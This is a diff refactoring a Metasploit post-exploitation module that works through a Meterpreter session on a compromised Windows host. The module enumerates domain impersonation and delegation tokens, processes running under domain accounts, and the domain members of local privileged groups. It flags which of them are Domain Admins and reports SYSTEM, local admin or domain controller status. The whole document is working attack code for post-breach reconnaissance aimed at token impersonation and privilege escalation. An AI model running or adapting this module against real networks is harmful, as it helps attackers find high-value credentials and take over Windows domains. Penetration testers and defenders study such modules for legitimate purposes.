@@ -1,251 +1,213 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-
 class MetasploitModule < Msf::Post
+  include Msf::Post::Windows::Priv
 
-  include Msf::Post::File
-  include Msf::Post::Windows::Registry
-
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows Gather Enumerate Domain Tokens',
-        'Description'   => %q{
-            This module will enumerate tokens present on a system that are part of the
-            domain the target host is part of, will also enumerate users in the local
-            Administrators, Users and Backup Operator groups to identify Domain members.
-            Processes will be also enumerated and checked if they are running under a
-            Domain account, on all checks the accounts, processes and tokens will be
-            checked if they are part of the Domain Admin group of the domain the machine
-            is a member of.
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Enumerate Domain Tokens',
+        'Description' => %q{
+          This module enumerates domain account tokens, processes running under
+          domain accounts, and domain users in the local Administrators, Users
+          and Backup Operator groups.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
-        'Platform'      => [ 'win'],
-        'SessionTypes'  => [ 'meterpreter' ]
-      ))
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
+        'Platform' => [ 'win'],
+        'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => []
+        },
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              incognito_list_tokens
+              stdapi_sys_config_getuid
+            ]
+          }
+        }
+      )
+    )
   end
 
-  # Run Method for when run command is issued
   def run
-    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
-    domain = get_domain()
+    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
+    print_status("Running module against #{hostname} (#{session.session_host})")
 
-    if not domain.empty?
-      uid = client.sys.config.getuid
-      dom_admins = list_domain_group_mem("Domain Admins")
+    domain = get_domain_name
 
-      if  uid =~ /#{domain}/
-        user = uid.split("\\")[1]
-        if dom_admins.include?(user)
-          print_good("Current session is running under a Domain Admin Account")
-        end
+    fail_with(Failure::Unknown, 'Could not retrieve domain name. Is the host part of a domain?') unless domain
+
+    @domain_admins = get_members_from_group('Domain Admins', domain) || []
+
+    print_error("Could not retrieve '#{domain}\\Domain Admins' group members.") if @domain_admins.blank?
+
+    netbios_domain_name = domain.split('.').first.upcase
+
+    uid = client.sys.config.getuid
+    if uid.starts_with?(netbios_domain_name)
+      user = uid.split('\\')[1]
+      print_good('Current session is running under a Domain Admin account') if @domain_admins.include?(user)
+    end
+
+    if domain_controller?
+      if is_system?
+        print_good('Current session is running as SYSTEM on a domain controller')
+      elsif is_admin?
+        print_good('Current session is running under a Local Admin account on a domain controller')
+      else
+        print_status('This host is a domain controller')
       end
-
-      if not is_dc?
-        list_group_members(domain, dom_admins)
+    else
+      if is_system?
+        print_good('Current session is running as SYSTEM')
+      elsif is_admin?
+        print_good('Current session is running under a Local Admin account')
       end
+      print_status('This host is not a domain controller')
 
-      list_tokens(domain, dom_admins)
-      list_processes(domain, dom_admins)
+      list_group_members(netbios_domain_name)
     end
+
+    list_processes(netbios_domain_name)
+    list_tokens(netbios_domain_name)
   end
 
-  # List local group members
-  def list_group_mem(group)
-    devisor = "-------------------------------------------------------------------------------\r\n"
-    raw_list = cmd_exec("net localgroup #{group}").split(devisor)[1]
-    account_list = raw_list.split("\r\n")
-    account_list.delete("The command completed successfully.")
-    return account_list
-  end
-
-  # List Members of a domain group
-  def list_domain_group_mem(group)
-    account_list = []
-    devisor = "-------------------------------------------------------------------------------\r\n"
-    raw_list = cmd_exec("net groups \"#{group}\" /domain").split(devisor)[1]
-    raw_list.split(" ").each do |m|
-      account_list << m
-    end
-    account_list.delete("The command completed successfully.")
-    return account_list
-  end
-
-  # Gets the Domain Name
-  def get_domain()
-    domain = ""
-    begin
-      subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History"
-      v_name = "DCName"
-      domain_dc = registry_getvaldata(subkey, v_name)
-      dom_info =  domain_dc.split('.')
-      domain = dom_info[1].upcase
-    rescue
-      print_error("This host is not part of a domain.")
-    end
-    return domain
-  end
-
-  # List Tokens precent on the domain
-  def list_tokens(domain,dom_admins)
+  def list_group_members(domain)
     tbl = Rex::Text::Table.new(
-      'Header'  => "Impersonation Tokens with Domain Context",
-      'Indent'  => 1,
+      'Header' => 'Account in Local Groups with Domain Context',
+      'Indent' => 1,
       'Columns' =>
       [
-        "Token Type",
-        "Account Type",
-        "Name",
-        "Domain Admin"
-      ])
-    print_status("Checking for Domain group and user tokens")
-    client.core.use("incognito")
-    user_tokens = client.incognito.incognito_list_tokens(0)
-    user_delegation = user_tokens["delegation"].split("\n")
-    user_impersonation = user_tokens["impersonation"].split("\n")
+        'Local Group',
+        'Member',
+        'Domain Admin'
+      ]
+    )
 
-    group_tokens = client.incognito.incognito_list_tokens(1)
-    group_delegation = group_tokens["delegation"].split("\n")
-    group_impersonation = group_tokens["impersonation"].split("\n")
+    print_status('Checking local groups for Domain Accounts and Groups')
+
+    [
+      'Administrators',
+      'Backup Operators',
+      'Users'
+    ].each do |group|
+      group_users = get_members_from_localgroup(group)
+
+      next unless group_users
+
+      vprint_status("Group '#{group}' members: #{group_users.join(', ')}")
+
+      group_users.each do |group_user|
+        next unless group_user.include?(domain)
+
+        user = group_user.split('\\')[1]
+        tbl << [group, group_user, @domain_admins.include?(user)]
+      end
+    end
+
+    print_line("\n#{tbl}\n")
+  end
+
+  def list_tokens(domain)
+    tbl = Rex::Text::Table.new(
+      'Header' => 'Impersonation Tokens with Domain Context',
+      'Indent' => 1,
+      'Columns' =>
+      [
+        'Token Type',
+        'Account Type',
+        'Account Name',
+        'Domain Admin'
+      ]
+    )
+    print_status('Checking for Domain group and user tokens')
+
+    user_tokens = client.incognito.incognito_list_tokens(0)
+    user_delegation = user_tokens['delegation'].split("\n")
+    user_impersonation = user_tokens['impersonation'].split("\n")
 
     user_delegation.each do |dt|
-      if dt =~ /#{domain}/
-        user = dt.split("\\")[1]
-        if dom_admins.include?(user)
-          tbl << ["Delegation","User",dt,true]
-        else
-          tbl << ["Delegation","User",dt,false]
-        end
-      end
+      next unless dt.include?(domain)
+
+      user = dt.split('\\')[1]
+      tbl << ['Delegation', 'User', dt, @domain_admins.include?(user)]
     end
 
     user_impersonation.each do |dt|
-      if dt =~ /#{domain}/
-        user = dt.split("\\")[1]
-        if dom_admins.include?(user)
-          tbl << ["Impersonation","User",dt,true]
-        else
-          tbl << ["Impersonation","User",dt,false]
-        end
-      end
+      next if dt == 'No tokens available'
+      next unless dt.include?(domain)
+
+      user = dt.split('\\')[1]
+      tbl << ['Impersonation', 'User', dt, @domain_admins.include?(user)]
     end
 
+    group_tokens = client.incognito.incognito_list_tokens(1)
+    group_delegation = group_tokens['delegation'].split("\n")
+    group_impersonation = group_tokens['impersonation'].split("\n")
+
     group_delegation.each do |dt|
-      if dt =~ /#{domain}/
-        user = dt.split("\\")[1]
-        if dom_admins.include?(user)
-          tbl << ["Delegation","Group",dt,true]
-        else
-          tbl << ["Delegation","Group",dt,false]
-        end
-      end
+      next unless dt.include?(domain)
+
+      user = dt.split('\\')[1]
+      tbl << ['Delegation', 'Group', dt, @domain_admins.include?(user)]
     end
 
     group_impersonation.each do |dt|
-      if dt =~ /#{domain}/
-        user = dt.split("\\")[1]
-        if dom_admins.include?(user)
-          tbl << ["Impersonation","Group",dt,true]
-        else
-          tbl << ["Impersonation","Group",dt,false]
-        end
-      end
+      next if dt == 'No tokens available'
+      next unless dt.include?(domain)
+
+      user = dt.split('\\')[1]
+      tbl << ['Impersonation', 'Group', dt, @domain_admins.include?(user)]
     end
-    results = tbl.to_s
-    print_line("\n" + results + "\n")
+
+    if tbl.rows.empty?
+      print_status('No domain tokens available')
+      return
+    end
+
+    print_line("\n#{tbl}\n")
   end
 
-  def list_group_members(domain,dom_admins)
+  def list_processes(domain)
     tbl = Rex::Text::Table.new(
-      'Header'  => "Account in Local Groups with Domain Context",
-      'Indent'  => 1,
+      'Header' => 'Processes under Domain Context',
+      'Indent' => 1,
       'Columns' =>
       [
-        "Group",
-        "Member",
-        "Domain Admin"
-      ])
-    print_status("Checking local groups for Domain Accounts and Groups")
-    admins = list_group_mem("Administrators")
-    users = list_group_mem("users")
-    backops = list_group_mem("\"Backup Operators\"")
-    admins.each do |dt|
-      if dt =~ /#{domain}/
-        user = dt.split("\\")[1]
-        if dom_admins.include?(user)
-          tbl << ["Administrators",dt,true]
-        else
-          tbl << ["Administrators",dt,false]
-        end
-      end
-    end
-
-    backops.each do |dt|
-      if dt =~ /#{domain}/
-        user = dt.split("\\")[1]
-        if dom_admins.include?(user)
-          tbl << ["Backup Operators",dt,true]
-        else
-          tbl << ["Backup Operators",dt,false]
-        end
-      end
-    end
-    users.each do |dt|
-      if dt =~ /#{domain}/
-        user = dt.split("\\")[1]
-        if dom_admins.include?(user)
-          tbl << ["Users",dt,true]
-        else
-          tbl << ["Users",dt,false]
-        end
-      end
-    end
-    results = tbl.to_s
-    print_line("\n" + results + "\n")
-  end
-
-  def list_processes(domain,dom_admins)
-    tbl = Rex::Text::Table.new(
-      'Header'  => "Processes under Domain Context",
-      'Indent'  => 1,
-      'Columns' =>
-      [
-        "Name",
-        "PID",
-        "Arch",
-        "User",
-        "Domain Admin"
-      ])
-    print_status("Checking for processes running under domain user")
+        'Process Name',
+        'PID',
+        'Arch',
+        'User',
+        'Domain Admin'
+      ]
+    )
+    print_status('Checking for processes running under domain user')
     client.sys.process.processes.each do |p|
-      if p['user'] =~ /#{domain}/
-        user = p['user'].split("\\")[1]
-        if dom_admins.include?(user)
-          tbl << [p['name'],p['pid'],p['arch'],p['user'],true]
-        else
-          tbl << [p['name'],p['pid'],p['arch'],p['user'],false]
-        end
-      end
-    end
-    results = tbl.to_s
-    print_line("\n" + results + "\n")
-  end
+      next unless p['user'].include?(domain)
 
-  # Function for checking if target is a DC
-  def is_dc?
-    is_dc_srv = false
-    serviceskey = "HKLM\\SYSTEM\\CurrentControlSet\\Services"
-    if registry_enumkeys(serviceskey).include?("NTDS")
-      if registry_enumkeys(serviceskey + "\\NTDS").include?("Parameters")
-        print_good("\tThis host is a Domain Controller!")
-        is_dc_srv = true
-      end
+      user = p['user'].split('\\')[1]
+      tbl << [
+        p['name'],
+        p['pid'],
+        p['arch'],
+        p['user'],
+        @domain_admins.include?(user)
+      ]
     end
-    return is_dc_srv
+
+    if tbl.rows.empty?
+      print_status('No processes running as domain users')
+      return
+    end
+
+    print_line("\n#{tbl}\n")
   end
 end
